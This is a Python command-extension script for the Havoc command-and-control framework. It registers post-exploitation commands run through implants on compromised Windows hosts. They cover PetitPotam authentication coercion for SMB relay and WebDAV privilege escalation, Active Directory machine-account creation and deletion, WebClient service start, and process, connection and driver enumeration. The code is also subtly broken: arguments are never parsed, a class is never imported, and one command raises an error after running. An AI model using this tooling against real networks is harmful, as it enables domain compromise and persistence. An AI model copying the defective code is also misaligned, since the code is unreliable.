from havoc import Demon, RegisterCommand
from struct import pack, calcsize


def petitpotam(demonID, *param):
    TaskID : str    = None
    demon  : Demon  = None

    packer          = Packer()
    demon           = Demon( demonID )
    num_params      = len(param)
    target          = ''
    capture_server  = ''

    if num_params != 2:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, 'Only accepts two parameters [Capture Server, Target]' )
        return False

    packer.addWstr(target)
    packer.addWstr(capture_server)

    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK, "Tasked demon to coerce target with PetitPotam")

    demon.InlineExecute( TaskID, "go", f"bin/petitpotam/PetitPotam.{demon.ProcessArch}.o", packer.getbuffer(), False )

    return TaskID


def smbinfo(demonID, *param):
    TaskID : str    = None
    demon  : Demon  = None

    packer          = Packer()
    demon           = Demon( demonID )
    num_params      = len(param)
    hostname  = ''

    if num_params != 1:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, 'Usage: smbinfo [Hostname]' )
        return False

    packer.addWstr( hostname )

    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK, f"Tasked demon to get remote system version info")

    demon.InlineExecute( TaskID, "go", f"bin/smbinfo/Smbinfo.{demon.ProcessArch}.o", packer.getbuffer(), False )

    return TaskID


def startwebclient(demonID, *param):
    TaskID : str    = None
    demon  : Demon  = None
    demon           = Demon( demonID )

    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK, f"Tasked demon to force start the Web Client service")

    demon.InlineExecute( TaskID, "go", f"bin/startwebclient/StartWebClient.{demon.ProcessArch}.o", b'', False )

    return TaskID


def addmachineaccount(demonID, *param):
    TaskID : str    = None
    demon  : Demon  = None

    packer          = Packer()
    demon           = Demon( demonID )
    num_params      = len(param)
    computername    = ''
    password        = ''

    if num_params != 2:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, 'Usage: addmachineaccount [Computer Name] [Password]' )
        return False

    packer.addWstr( computername )
    packer.addWstr( password )

    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK, f"Tasked demon to use Active Directory Service Interfaces (ADSI) to add a computer account to AD.")

    demon.InlineExecute( TaskID, "go", f"bin/machineaccount/AddMachineAccount.{demon.ProcessArch}.o", packer.getbuffer(), False )

    return TaskID


def delmachineaccount(demonID, *param):
    TaskID : str    = None
    demon  : Demon  = None

    packer          = Packer()
    demon           = Demon( demonID )
    num_params      = len(param)
    computername    = ''

    if num_params != 1:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, 'Usage: delmachineaccount [Computer Name]' )
        return False

    packer.addWstr( computername )

    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK, f"Tasked demon to use Active Directory Service Interfaces (ADSI) to delete a computer account from AD.")

    demon.InlineExecute( TaskID, "go", f"bin/machineaccount/DelMachineAccount.{demon.ProcessArch}.o", packer.getbuffer(), False )

    return TaskID


def getmachineaccountquota(demonID, *param):
    TaskID : str    = None
    demon  : Demon  = None
    demon           = Demon( demonID )

    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK, "Tasked demon to use Active Directory Service Interfaces (ADSI) to read the ms-DS-MachineAccountQuota value from AD.")

    demon.InlineExecute( TaskID, "go", f"bin/machineaccount/GetMachineAccountQuota.{demon.ProcessArch}.o", b'', False )

    return TaskID


def psc(demonID, *param):
    TaskID : str    = None
    demon  : Demon  = None
    demon           = Demon( demonID )

    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK, "Show processes with established TCP and RDP connections.")
    demon.InlineExecute( TaskID, "go", f"bin/pstools/Psc.{demon.ProcessArch}.o", b'', False )

    return TaskID


def psx(demonID, *param):
    TaskID : str    = None
    demon  : Demon  = None
    demon           = Demon( demonID )
    # packer          = Packer()
    # num_params      = param.len()

    # if num_params == 1:
    #     packer.addstr( num_params[0] )
    #     TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK, "Show more detailed information from all processes running on the target system.")
    #     demon.InlineExecute( TaskID, "go", f"bin/pstools/Psx.{demon.ProcessArch}.o", packer.getBuffer(), False )

    # else:
    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK, "Show information from all processes running on the target system.")
    demon.InlineExecute( TaskID, "go", f"bin/pstools/Psx.{demon.ProcessArch}.o", b'00', False )

    return TaskID


# def psxx(demonID, *param):
#     TaskID : str    = None
#     demon  : Demon  = None
#     demon           = Demon( demonID )

#     TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK, "Show more detailed information from all processes running on the target system.")

#     demon.InlineExecute( TaskID, "go", f"bin/pstools/Psx.{demon.ProcessArch}.o", b'', False )


def psm(demonID, *param):
    TaskID : str    = None
    demon  : Demon  = None
    demon           = Demon( demonID )
    packer          = Packer()
    processID : int = 0

    packer.addint( processID )
    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK, "Show detailed information from a specific process id (loaded modules, tcp connections etc.).")
    demon.InlineExecute( TaskID, "go", f"bin/pstools/Psm.{demon.ProcessArch}.o", packer.getbuffer(), False )

    raise NotImplementedError
    # return TaskID


def psw(demonID, *param):
    TaskID : str    = None
    demon  : Demon  = None
    demon           = Demon( demonID )

    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK, "Show Window titles from processes with active Windows.")

    demon.InlineExecute( TaskID, "go", f"bin/pstools/Psw.{demon.ProcessArch}.o", b'', False )


def psk(demonID, *param):
    TaskID : str    = None
    demon  : Demon  = None
    demon           = Demon( demonID )

    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK, "Show detailed information from the windows kernel and loaded driver modules.")

    demon.InlineExecute( TaskID, "go", f"bin/pstools/Psk.{demon.ProcessArch}.o", b'', False )

    return TaskID

# PetitPotam
RegisterCommand(petitpotam, "", "petitpotam", "Coerce Windows hosts to authenticate to other machines via MS-EFSRPC", 0, "[Capture Server] [Target]", """
                    SMB Relay Attack                : petitpotam KALI DC2019
                    WebDAV LPE Attack               : petitpotam KALI@80/nop localhost
                    WebDAV LPE w/SOCKS and rportfwd : petitpotam localhost@80/nop localhost
""")

# SMBInfo
RegisterCommand(smbinfo, "", "smbinfo", "Gather remote system version info using the NetWkstaGetInfo API.", 0, "[Hostname]", "CASTELBLACK")

# Web Client
RegisterCommand(startwebclient, "", "start_webclient", "Force start the Web Client service.", 0, "", "")

# Machine Account
RegisterCommand(addmachineaccount, "", "add_machine_account", "Add a computer account to the Active Directory domain.", 0, "[Computer Name] [Password]", "PIVOT n3rdl0l")
RegisterCommand(delmachineaccount, "", "del_machine_account", "Delete a computer account to the Active Directory domain.", 0, "[Computer Name]", "PIVOT")
RegisterCommand(getmachineaccountquota, "", "get_machine_account_quota", "Read the ms-DS-MachineAccountQuota value from AD", 0, "", "")

# PS Tools (Psx, Psc, Psm, Psw, Psk)
RegisterCommand(psc, "", "psc", "Show processes with established TCP and RDP connections.", 0, "", "")
RegisterCommand(psx, "", "psx", "Show information from all processes running on the target system.", 0, "", "")
# RegisterCommand(psxx, "", "psxx", "Get detailed information from processes with established TCP and RDP connections.", 0, "", "")
RegisterCommand(psw, "", "psw", "Show Window titles from processes with active Windows.", 0, "", "")
RegisterCommand(psm, "", "psm", "Show detailed information from a specific process id (loaded modules, tcp connections etc.).", 0, "[process id]", "4932")
RegisterCommand(psk, "", "psk", "Show detailed information from the windows kernel and loaded driver modules.", 0, "", "")
